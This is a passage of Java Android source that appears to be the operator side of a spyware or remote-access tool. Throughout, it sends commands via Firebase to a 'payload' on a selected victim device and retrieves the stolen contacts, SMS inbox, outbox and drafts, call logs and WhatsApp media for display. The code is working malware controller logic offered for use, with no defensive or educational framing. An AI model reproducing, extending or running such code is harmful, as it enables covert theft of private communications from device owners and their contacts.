                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startContactExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Contacts Extraction progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(6)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("contacts")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            //TODO UPDATE SQL
                                                            if (c[0] == 1) {
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nExtracting and displaying data."));
                                                                alertDialog.dismiss();
                                                                startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri", snapshot.getValue(String.class)));
                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                snapshot.getRef().removeEventListener(this);
                                                            }

                                                            c[0]++;
                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startSMSDraftLogExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Sms Draft Extraction progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(3)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("sms_draft")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            //TODO UPDATE SQL
                                                            if (c[0] == 1) {
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nExtracting and displaying data."));
                                                                alertDialog.dismiss();
                                                                startActivity(new Intent(getContext(), SmsDisplay.class).putExtra("uri", snapshot.getValue(String.class)));
                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;
                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startSMSOutboxLogExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Sms Outbox Extraction progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(2)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("sms_outbox")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            if (c[0] == 1) {
                                                                //TODO UPDATE SQL
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nExtracting and displaying data."));
                                                                alertDialog.dismiss();
                                                                startActivity(new Intent(getContext(), SmsDisplay.class).putExtra("uri", snapshot.getValue(String.class)));
                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startSMSLogExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Sms Inbox Extraction progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(1)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("sms_inbox")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            if (c[0] == 1) {
                                                                //TODO UPDATE SQL
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nExtracting and displaying data."));
                                                                alertDialog.dismiss();
                                                                startActivity(new Intent(getContext(), SmsDisplay.class).putExtra("uri", snapshot.getValue(String.class)));
                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startCallLogExtraction() {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Call log Extraction progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(0)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("calls")
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            if (c[0] == 1) {
                                                                //TODO UPDATE SQL
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nExtracting and displaying data."));
                                                                alertDialog.dismiss();
                                                                startActivity(new Intent(getContext(), PhoneDisplay.class).putExtra("uri", snapshot.getValue(String.class)));
                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();

                    }
                });
    }

    private void startWhatsappMediaExtraction(String extractionTittle, int command) {
        final int[] c = {0};
        alertDialog = new AlertDialog.Builder(getActivity())
                .setMessage("Waiting for payload response... please do not close this window.")
                .create();
        alertDialog.show();
        PayloadConnection
                .initializePayloadConnection()
                .checkPayloadConnection(new PayloadConnectionListner() {
                    @Override
                    public void onConnectionSuccessful() {
                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
                        alertDialog.dismiss();
                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
                                .setCancelable(false)
                                .setPositiveButton("STOP", (o, l) -> {
                                })
                                .setTitle("Extraction of selected number of " + extractionTittle + " in progress")
                                .setMessage("\nChecking payload.... DONE")
                                .show();
                        TextView messageView = alertDialog.findViewById(android.R.id.message);
                        FirebaseDatabase
                                .getInstance()
                                .getReference("test")
                                .child(selected_device)
                                .child("command")
                                .setValue(command)
                                .addOnCompleteListener(p -> {
                                    if (p.isSuccessful()) {
                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Files... DONE\nCompressing and uploading... PROGRESS"));
                                        FirebaseDatabase
                                                .getInstance()
                                                .getReference("LIVE")
                                                .child(selected_device)
                                                .child("whatsapp_media_" + command)
                                                .addValueEventListener(new ValueEventListener() {
                                                    @Override
                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                                        if (snapshot.exists()) {
                                                            //TODO UPDATE SQL
                                                            if (c[0] == 1) {

                                                                FirebaseDatabase.getInstance().getReference("test").child(selected_device).child("command").setValue(99);
                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
                                                                alertDialog.dismiss();
                                                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(snapshot.getValue(String.class)));
                                                                startActivity(browserIntent);
                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
                                                                snapshot.getRef().removeEventListener(this);
                                                            }
                                                            c[0]++;

                                                        }
                                                    }

                                                    @Override
                                                    public void onCancelled(@NonNull DatabaseError error) {

                                                    }
                                                });

                                    } else {
                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);

                                    }
                                });


                    }

                    @Override
                    public void onPayloadError(String message) {
                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);

                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
                                .setAction("DISMISS", v -> {
                                }).show();
                    }
                });
    }

    public void onPause() {
        if (t1 != null) {
            t1.stop();
            t1.shutdown();
        }
        super.onPause();
    }

    @Override
    public void onResume() {
        super.onResume();
        t1 = new TextToSpeech(getActivity(), status -> {
            if (status != TextToSpeech.ERROR) {
                t1.setLanguage(Locale.US);
            }
        });

    }

}